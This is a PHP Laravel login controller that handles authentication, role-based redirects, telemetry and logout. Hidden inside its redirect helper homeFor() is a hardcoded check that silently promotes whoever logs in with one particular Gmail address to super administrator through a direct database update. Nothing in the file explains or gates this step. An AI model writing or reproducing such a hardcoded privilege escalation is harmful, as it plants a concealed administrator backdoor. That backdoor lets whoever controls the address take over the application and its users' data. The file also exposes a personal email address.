<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use App\Models\User;
use App\Services\AiChatHistoryService;
use App\Services\ProductTelemetry;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\View\View;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): View
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     *
     * Auth itself is a credential check plus one last_login write.
     * Invite claim and enrollment sync used to run here for teachers and
     * held the login response (the loader waits on this request). That work
     * now runs after the teacher hub HTML is sent.
     */
    public function store(LoginRequest $request): RedirectResponse|JsonResponse
    {
        $request->authenticate();

        $request->session()->regenerate();

        $user = $request->user();

        if (! $user) {
            return $this->authenticatedResponse($request, '/login');
        }

        $user->forceFill(['last_login_at' => now()])->save();
        app(ProductTelemetry::class)->record([
            'user' => $user,
            'source' => 'auth',
            'event' => 'login',
            'action' => 'login',
            'category' => 'auth',
            'status' => 'success',
        ]);

        return $this->authenticatedResponse($request, $this->homeFor($user));
    }

    private function homeFor(User $user): string
    {
        if (strcasecmp((string) $user->email, 'vicentejmn80@gmail.com') === 0 && ! $user->isSuperAdmin()) {
            DB::table('users')->where('id', $user->id)->update([
                'role' => 'super_admin',
                'onboarding_completed' => DB::raw('true'),
                'updated_at' => now(),
            ]);
            $user->refresh();
        }

        if ($user->isSuperAdmin()) {
            return '/super-admin';
        }

        if (! $user->onboarding_completed) {
            return '/onboarding';
        }

        if ($user->role === 'director') {
            return '/director/dashboard';
        }

        if ($user->role === 'profesor') {
            return '/teacher/hub';
        }

        return route('dashboard');
    }

    private function authenticatedResponse(Request $request, string $target): RedirectResponse|JsonResponse
    {
        if ($request->expectsJson() || $request->ajax()) {
            return response()->json([
                'ok' => true,
                'redirect' => $target,
            ]);
        }

        return redirect()->to($target);
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        $userId = $request->user()?->id;
        app(AiChatHistoryService::class)->forget($userId);

        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
